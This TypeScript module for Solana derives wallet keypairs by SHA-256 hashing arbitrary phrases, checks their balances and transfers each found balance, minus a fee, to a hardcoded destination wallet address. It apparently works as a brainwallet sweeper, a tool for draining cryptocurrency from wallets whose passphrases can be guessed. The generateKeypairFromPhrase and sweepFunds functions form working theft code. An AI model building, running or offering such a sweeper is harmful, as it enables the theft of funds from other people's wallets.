import { Connection, PublicKey, Keypair, Transaction, SystemProgram, sendAndConfirmTransaction } from "@solana/web3.js"
import * as crypto from "crypto"
import { LAMPORTS_PER_SOL } from "@solana/web3.js"

// Your destination wallet address
const DESTINATION_WALLET = process.env.DESTINATION_WALLET_SOL || "7DjhBezJEbjLeaqXmKENZmPbDAHiC1f11GMfTjPSAmLD"

// Update RPC endpoints to use the proxy
const RPC_ENDPOINTS = [
  "/api/rpc/solana", // Primary: Our proxied endpoint
  process.env.SOLANA_PROXY_URL || "/api/rpc/solana", // Fallback to local proxy if env not set
]

// Get a connection with fallback support
export function getConnection(): Connection {
  // Start with the first endpoint
  return new Connection(RPC_ENDPOINTS[0], {
    commitment: "confirmed",
    maxSupportedTransactionVersion: 0,
  })
}

// Try all endpoints until one works
export async function executeWithFallback<T>(operation: (connection: Connection) => Promise<T>): Promise<T> {
  for (let i = 0; i < RPC_ENDPOINTS.length; i++) {
    const connection = new Connection(RPC_ENDPOINTS[i], {
      commitment: "confirmed",
      maxSupportedTransactionVersion: 0,
    })
    try {
      return await operation(connection)
    } catch (error) {
      console.error(`RPC endpoint ${RPC_ENDPOINTS[i]} failed:`, error)
      // If this is the last endpoint, throw the error
      if (i === RPC_ENDPOINTS.length - 1) {
        throw error
      }
      // Otherwise try the next endpoint
    }
  }
  throw new Error("All RPC endpoints failed")
}

// Rest of the file remains unchanged
export function generateKeypairFromPhrase(phrase: string): Keypair {
  // Create a SHA-256 hash of the phrase
  const hash = crypto.createHash("sha256").update(phrase).digest()
  // Use the first 32 bytes of the hash as the seed
  return Keypair.fromSeed(Uint8Array.from(hash.slice(0, 32)))
}

export async function checkBalance(publicKey: PublicKey): Promise<number> {
  return executeWithFallback(async (connection) => {
    const balance = await connection.getBalance(publicKey)
    return balance / LAMPORTS_PER_SOL // Convert lamports to SOL
  })
}

export async function sweepFunds(keypair: Keypair): Promise<string> {
  return executeWithFallback(async (connection) => {
    const balance = await connection.getBalance(keypair.publicKey)

    // Calculate the fee (approximately 5000 lamports)
    const fee = 5000

    // If balance is too small to cover the fee, don't sweep
    if (balance <= fee) {
      throw new Error("Balance too small to cover transaction fee")
    }

    // Create a transaction to send the funds
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: keypair.publicKey,
        toPubkey: new PublicKey(DESTINATION_WALLET),
        lamports: balance - fee,
      }),
    )

    // Send the transaction
    const signature = await sendAndConfirmTransaction(connection, transaction, [keypair])

    return signature
  })
}

export function formatPublicKey(publicKey: string): string {
  return `${publicKey.slice(0, 6)}...${publicKey.slice(-4)}`
}

export function formatSol(sol: number): string {
  return sol.toFixed(4)
}

export function getExplorerLink(signature: string): string {
  return `https://explorer.solana.com/tx/${signature}`
}

export function getAddressExplorerLink(address: string): string {
  return `https://explorer.solana.com/address/${address}`
}
